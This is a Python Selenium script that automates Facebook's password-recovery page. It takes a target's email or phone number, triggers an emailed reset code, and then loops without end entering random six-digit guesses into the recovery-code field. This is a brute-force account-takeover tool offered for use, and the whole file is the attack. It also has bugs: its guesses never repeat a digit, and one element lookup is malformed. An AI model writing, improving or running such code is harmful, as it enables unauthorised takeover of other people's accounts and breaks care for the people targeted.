from selenium.common.exceptions import TimeoutException
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
# from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup
import time


import random

def generate_unique_random_numbers():
    digits = list(range(10))
    random.shuffle(digits)
    random_number = random.sample(digits, 6)
    random_number = ''.join(map(str, random_number))
    return random_number

# Generate 5 unique random numbers
#random_numbers = generate_unique_random_numbers()
#print(random_numbers)





# options = Options()
# options.add_argument("--disable-notifications")

print("[!]Initializing dirver...")
# driver = webdriver.Chrome(options=options)
driver = webdriver.Firefox()

#driver.get("https://www.facebook.com/login/identify/?ctx=recover")
driver.get("https://www.facebook.com/recover/code/?em[0]=b***%40*******&rm=send_email&hash=AUYnHrvqL8t32h3I3m4")
username_field = driver.find_element(By.ID, "identify_email")
username = input("enter your username Email or Phone:")
username_field.send_keys(username)
search_button = driver.find_element(By.ID, "did_submit")
search_button.click()
wait = WebDriverWait(driver, 10)
try:
    selectAccbtns = wait.until(EC.visibility_of_element_located((By.CLASS_NAME, "cometAccountRecoveryCard\/loggedOutAccountAuxContent")))
    selectAccbtns.find_element(By.TAG_NAME, "a").click()
except TimeoutException:
    print("not an account")

try:
    tryanotherway = wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "a._42ft._4jy0._aklv._4jy3._517h._51sy")))
except TimeoutException:
    tryanotherway = wait.until(EC.visibility_of_element_located((By.TAG_NAME, "a")))
    tryanotherway = tryanotherway.find_element((By.NAME, "tryanotherway"))

tryanotherway.click()
print(tryanotherway)
try:
    sendEmail = wait.until(EC.visibility_of_element_located((By.ID, "send_email")))
except TimeoutException:
    sendEmail = wait.until(EC.visibility_of_element_located((By.ID, "send_email")))
sendEmail.click()
try:
    resetAction = wait.until(EC.visibility_of_element_located((By.XPATH, "//button[@name='reset_action']")))
except TimeoutException:
    resetAction = wait.until(EC.visibility_of_element_located((By.XPATH, "//button[@name='reset_action']")))
resetAction.click()

time.sleep(1)

#try:
#    captchainput = wait.until(EC.visibility_of_element_located((By.ID, "captcha_response")))
#    captchatext = input("Enter the captcha:")
#    captchainput.send_keys(captchatext)
#    try:
#        captchabtn= wait.until(EC.visibility_of_element_located((By.NAME, "captcha_submit_button")))
#    except TimeoutException:
#        captchabtn = wait.until(EC.visibility_of_element_located((By.NAME, "captcha_submit_button")))
#    captchabtn.click()
#except TimeoutException:
#    print("no captcha")



try:
    textinput = wait.until(EC.visibility_of_element_located((By.ID, "recovery_code_entry")))
except TimeoutException:
    print("error")
while True:
    textinput = wait.until(EC.visibility_of_element_located((By.ID, "recovery_code_entry")))
    digits = list(range(10))
    random.shuffle(digits)
    random_number = random.sample(digits, 6)
    random_number = ''.join(map(str, random_number))
    #thetext = input("insert the code:")
    textinput.send_keys(random_number)
    submitKey = wait.until(EC.visibility_of_element_located((By.XPATH, "//button[@name='reset_action']")))
    submitKey.click()
    try:
        checkpoint = wait.until(EC.visibility_of_element_located((By.CLASS_NAME, "uiHeaderTitle")))
    except TimeoutException:
        break;
#driver.quit()

